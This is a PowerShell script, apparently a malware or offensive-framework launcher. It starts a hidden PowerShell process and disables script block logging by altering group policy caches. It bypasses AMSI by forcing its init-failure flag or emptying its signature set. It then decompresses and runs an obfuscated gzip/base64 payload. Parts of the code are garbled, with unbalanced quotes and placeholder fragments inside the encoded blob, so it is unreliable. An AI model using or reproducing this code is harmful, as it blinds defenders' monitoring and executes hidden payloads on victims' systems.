if ([IntPtr]::Size -eq 4) {
    $b = 'powershell.exe'
} else {
    $b = $env:windir + '\syswow64\WindowsPowerShell\v1.0\powershell.exe'
}

$s = New-Object System.Diagnostics.ProcessStartInfo
$s.FileName = $b
$s.Arguments = '-noni -nop -w hidden -c $jvXKr=(''ScriptblockLogging'' -f 'L','p','B')
$p1 = ('Enable{0}cip{1}BlockLogging' -f 'e','t','r','S')

if ($PSVersionTable.PSVersion.Major -ge 3) {
    $oiDpB = [Ref].Assembly.GetType(('System.Management.Automation.CommandDiscovery' -f 'S','g','U','A','l','y'))
    $vos0 = $oiDpB.GetField('cachedGroupPolicySettings','NonPublic,Static')
    $dI = [Collections.Generic.Dictionary[string,System.Object]]::new()
    $uwrdw = [Ref].Assembly.GetType(('System.Management.Automation.Utils' -f 'u','S','U','g','M','y','l','o','A','n'))
    $kK = ('EnableScriptblockInvocationLogging' -f 'p','v','E','r','e','B')
    
    if ($uwrdw) {
        $uwrdw.GetField(('amiIiFail{2}{3}d' -f 's','t','l','e','n'), 'NonPublic,Static').SetValue($null, $true)
    }
    
    if ($vos0) {
        $pzV = $vos0.GetValue($null)
        
        if ($pzV[$jvXKr]) {
            $pzV[$jvXKr][$kK] = 0
            $pzV[$jvXKr][$p1] = 0
        }
        
        $dI.Add($kK, 0)
        $dI.Add($p1, 0)
        $pzV['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\' + $jvXKr] = $dI
    } else {
        [Ref].Assembly.GetType(('System.Management.Automation.AmsiUtils' -f 'B','s','g','y','u','M')).GetField('signatures','NonPublic,Static').SetValue($null, (New-Object Collections.Generic.HashSet[string]))
    }
}

&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream([System.Convert]::FromBase64String(('H4sIANWsdWQCA7VWbW+jOB{1}+ftL+B7SKBGjTQF6u21Za6Qy{2}kLZJk9K8b3RywQ{2}3BqfgNJvu7X+/gYSmVdu7vZPWUlpsz4zHzzwz48U69gTlsSTSu3Pp+4ffpP3o4' + 'QRHklLyj/1RWSrdx2QzHzIupCtBYvLO1WvAw3UldRQZSRbrmq21Sv0k0+kw+wbjUKyjTz+dIJg2p1+7jGMmyU9E9/0W0oIFONq0TW9N45IErUjXKtw8A39GFdf6sHm3yCO7oBAAA='))))).ReadToEnd()))))).Invoke()
